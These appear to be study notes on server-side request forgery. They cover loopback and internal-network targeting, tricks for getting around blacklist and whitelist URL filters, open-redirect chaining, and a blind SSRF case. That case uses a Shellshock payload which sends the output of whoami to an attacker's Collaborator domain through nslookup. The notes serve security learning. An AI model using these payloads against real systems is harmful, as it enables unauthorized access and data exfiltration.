# Server-Side Request Forgery (SSRF)

result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems

* allow an attacker to perform arbitrary command execution.
  * SSRF attacks against the server itself
    * make an HTTP request back to the server that is hosting the application, via its loopback network interface.
    * 127.0.0.1, localhost or alternatives (2130706433, 017700000001, or 127.1)
  * SSRF attacks against other back-end systems
    * sometimes back-end systems/admin interfaces are accessible using private ip address (brute force ip's)
  * SSRF with blacklist-based input filters
    * Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose
    * URL encoding for bypass of blacklisted strings
    * Using alternatives for localhost
  * SSRF with whitelist-based input filters
    * You can embed credentials in a URL before the hostname, using the @ character. For example:https://expected-host@evil-host
    * You can use the # character to indicate a URL fragment. For example:https://evil-host#expected-host
    * You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:https://expected-host.evil-host
    * You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
      * You can use combinations of these techniques together.
    * example : http%3A%2F%2F127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos (app check for the domain name if it is stock.weliketoshop.net $ bypass this filter using @ and double encoded # (%2523)
  * Bypassing SSRF filters via open redirection
    * check for any parameter that allows open redirection try ssrf if possible
    * use the same path above obtained in any other parameter that makes call to internal systems
  * Blind SSRF with Shellshock exploitation
    * payload - () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
    * referrer header initiated a http request if url provided along with the contents of user-agent string
    * provide the shellshock payload in the user-agent header
    * brute force an internal system by providing IP in referrer header which will send the user-agent content and gets executed on the internal system
